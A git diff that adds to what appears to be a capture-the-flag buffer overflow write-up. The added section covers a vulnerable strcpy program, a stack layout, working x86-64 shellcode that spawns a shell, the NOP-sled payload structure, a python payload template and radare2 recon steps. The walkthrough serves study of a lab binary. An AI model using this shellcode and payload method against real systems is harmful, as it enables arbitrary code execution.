@@ -746,7 +746,7 @@ Input length > 40 chars → Overwrites return address (RIP control)
 
 ## Overwriting Function Pointers
 
-### The Code
+### Task 7 Code
 
 ```c
 #include <stdlib.h>
@@ -908,7 +908,218 @@ Simplify the exploit using python to generate the bulk of the input.
 
 ![Exploit](assets/buffer-overflow-11-function-pointer-08.png) 
 
-
 ## BUFFER OVERFLOW EXERCISE 1
+
+### Task 8 Code
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void copy_arg(char *string)
+{
+    char buffer[140];
+    strcpy(buffer, string);
+    printf("%s\n", buffer);
+    return 0;
+}
+
+int main(int argc, char **argv)
+{
+    printf("Here's a program that echo's out your input\n");
+    copy_arg(argv[1]);
+}
+```
+
+In this example, `strcpy` function (within the `copy_arg` function) copies input from a string `argv[1]`,  which is a command line argument, to a buffer of length 140 bytes. 
+`strcpy` does not check the length of the data being input making it possible to overflow the buffer.
+Something more malicious is possible.  
+Let’s take a look at what the stack will look like for the copy_arg function(this stack excludes the stack frame for the strcpy function): 
+
+### The Stack Frame  
+
+```md
+STACK MEMORY LAYOUT (x86-64, System V ABI, 16-byte aligned)
+============================================================
+
+Memory Address    Content                     Description
+--------------    -------                     -----------
+
+Higher Memory
+     ↑
+     │ Stack grows downward
+     ↓
+
+0x7fff8000    ┌─────────────────────────────┐ ← STACK BOTTOM
+              │    ENVIRONMENT VARIABLES    │   (Process startup data)
+              │         ARGV ARRAY          │
+              │                             │
+              └─────────────────────────────┘
+
+              ┌─────────────────────────────┐ ← MAIN'S STACK FRAME
+0x7fff7ff0    │        char **argv          │   (RSI register parameter)
+              │         (8 bytes)           │   (pointer to argument array)
+              ├─────────────────────────────┤
+0x7fff7fe8    │         int argc            │   (RDI register parameter)
+              │         (4 bytes)           │   (argument count)
+              │       [4 byte pad]          │   (alignment padding)
+              ├─────────────────────────────┤ ← 16-byte boundary
+0x7fff7fe0    │     RETURN ADDRESS          │ ← Where main() returns to
+              │        (8 bytes)            │   
+              ├─────────────────────────────┤
+0x7fff7fd8    │     SAVED RBP (main)        │ ← Saved base pointer
+              │        (8 bytes)            │   (caller's frame pointer)
+              ├─────────────────────────────┤ ← 16-byte boundary
+0x7fff7fd0    │                             │
+              │     CALL SETUP SPACE        │ ← Space for function call
+              │      (16 bytes)             │   (ABI requirements)
+              └─────────────────────────────┘
+
+              ┌─────────────────────────────┐ ← COPY_ARG'S STACK FRAME
+0x7fff7fc0    │     char *string (RDI)      │ ← Function parameter (argv[1])
+              │        (8 bytes)            │   (passed in RDI register)
+              ├─────────────────────────────┤
+0x7fff7fb8    │    RETURN ADDRESS           │ ← Where copy_arg() returns
+              │        (8 bytes)            │   (back to main + offset)
+              ├─────────────────────────────┤ ← 16-byte boundary
+0x7fff7fb0    │    SAVED RBP (copy_arg)     │ ← Saved base pointer
+              │        (8 bytes)            │   (main's frame pointer)
+              ├─────────────────────────────┤
+0x7fff7fa8    │                             │
+              │                             │
+              │                             │
+              │     buffer[132-139]         │ ← buffer[132] through buffer[139]
+              │      (8 bytes)              │   (end of 140-byte buffer)
+              ├─────────────────────────────┤
+0x7fff7fa0    │     buffer[124-131]         │
+              │      (8 bytes)              │
+              ├─────────────────────────────┤
+0x7fff7f98    │     buffer[116-123]         │
+              │      (8 bytes)              │
+              ├─────────────────────────────┤
+0x7fff7f90    │     buffer[108-115]         │
+              │      (8 bytes)              │
+              ├─────────────────────────────┤
+              │         ...                 │ ← CHAR BUFFER[140]
+              │    (buffer continues)       │   (140 bytes total allocation)
+              │         ...                 │   (rounded up for alignment)
+              ├─────────────────────────────┤
+0x7fff7f30    │     buffer[24-31]           │
+              │      (8 bytes)              │
+              ├─────────────────────────────┤
+0x7fff7f28    │     buffer[16-23]           │
+              │      (8 bytes)              │
+              ├─────────────────────────────┤
+0x7fff7f20    │     buffer[8-15]            │
+              │      (8 bytes)              │
+              ├─────────────────────────────┤ ← 16-byte boundary
+0x7fff7f18    │     buffer[0-7]             │ ← buffer[0] through buffer[7]
+              │      (8 bytes)              │   (start of buffer - lowest addr)
+              └─────────────────────────────┘
+
+Lower Memory Addresses
+
+
+STACK FRAME STRUCTURE (x86-64):
+===============================
+
+copy_arg() Stack Frame Layout:
+┌─────────────────────────────────┐ ← Higher addresses
+│        string parameter         │ ← RDI (not on stack in x86-64)
+├─────────────────────────────────┤
+│       Return Address            │ ← RIP (8 bytes)
+├─────────────────────────────────┤
+│       Saved RBP                 │ ← RBP (8 bytes)  
+├─────────────────────────────────┤ ← Current RBP points here
+│                                 │
+│       buffer[140]               │ ← 140 bytes (+ alignment padding)
+│                                 │
+└─────────────────────────────────┘ ← Lower addresses
+```
+
+Earlier, we saw that when a function, in this case main, calls another function, in this case copy_args, it needs to add the return address on the stack so the callee function(copy_args) knows where to transfer control to once it has finished executing. From the stack above, we know that data will be copied upwards from buffer[0] to buffer[140]. Since we can overflow the buffer, it also follows that we can overflow the return address with our own value. We can control where the function returns and change the flow of execution of a program(very cool, right?)  
+
+### Shellcode  
+
+Know that we know we can control the flow of execution by directing the return address to some memory address, how do we actually do something useful with this. This is where shellcode comes in; shell code quite literally is code that will open up a shell. More specifically, it is binary instructions that can be executed. Since shellcode is just machine code(in the form of binary instructions), you can usually start of by writing a C program to do what you want, compile it into assembly and extract the hex characters(alternatively it would involve writing your own assembly). 
+
+For now we’ll use this shellcode that opens up a basic shell:
+`\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05`
+
+The basic idea is that we need to point the overwritten return address to the shellcode, but where do we actually store the shellcode and what actual address do we point it at?  
+Why don’t we store the shellcode in the buffer - because we know the address at the beginning of the buffer, we can just overwrite the return address to point to the start of the buffer. 
+Here’s the general process so far:
+
+- Find the start address of the buffer and the start address of the return address
+- Calculate the difference between these addresses so you know how much data to enter to overflow
+- Start out by entering the shellcode in the buffer, entering random data between the shellcode and the return address, and the address of the buffer in the return address
+
+![Shell Code In Stack](assets/buffer-overflow-12-task8-1.png)
+
+Memory addresses may not be the same on different systems, even across the same computer when the program is recompiled. 
+Make this more flexible by using a NOP instruction. A NOP instruction is a no operation instruction - when the system processes this instruction, it does nothing, and carries on execution. A NOP instruction is represented using \x90. Putting NOPs as part of the payload means an attacker can jump anywhere in the memory region that includes a NOP and eventually reach the intended instructions. This is what an injection vector would look like:
+
+```markdown
+┌──────────────────┐────────────────────┐────────────────────────┐
+│     NOP Sled     │     Shell Code     |     Memory Address     |   
+└──────────────────┘────────────────────┘────────────────────────┘
+```
+
+You’ve probably noticed that shellcode, memory addresses and NOP sleds are usually in hex code. To make it easy to pass the payload to an input program, you can use python:
+
+`python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”`
+
+### Task 8 Exploit  
+
+**Known**  
+
+-The buffer is 140 bytes
+
+**Initial Recon**  
+
+
+Use Radare2 to open the buffer-overflow script (`:> r2 buffer-overflow`),
+perform initial analysis (`:> aaa`), and  
+enumerate the flagspace (`:> fs`) 
+
+![Initial Recon 1](assets/buffer-overflow-13-task8-2.png)
+
+This reveals the entry point of the progra is 0x00400450  
+
+enumerate the flagspaces until there is a reference to the copy_arg function, which is found in the symbols flagspace:  
+
+`:> fs symbols; f`  
+
+The entry point of this function is 0x00400527  
+
+![Initial Recon 2](assets/buffer-overflow-14-task8-3.png)  
+
+Use a Hex calculator to identify the difference.  
+
+In Hex value:
+00400527 – 00400450 = D7
+
+In Decimal value:
+4195623 – 4195408 = 215
+
+![Hex Math](/assets/buffer-overflow-17-task8-6.png)  
+
+Move to the entry point of the function  
+
+`:> s sym.copy_arg`  
+
+This will move to the entry point of the copy_arg function, shown by the display of the memory address corresponding to the flagspace
+
+![Function Entry Point](assets/buffer-overflow-15-task8-4.png)  
+
+Print the function to learn more about what happens inside
+
+`:> pdf`  
+
+![copy_arg Function](assets/buffer-overflow-16-task8-5.png)  
+
+`python -c 'print "A" * 146' | ./buffer-overflow`
+
+
 
 ## BUFFER OVERFLOW EXERCISE 2
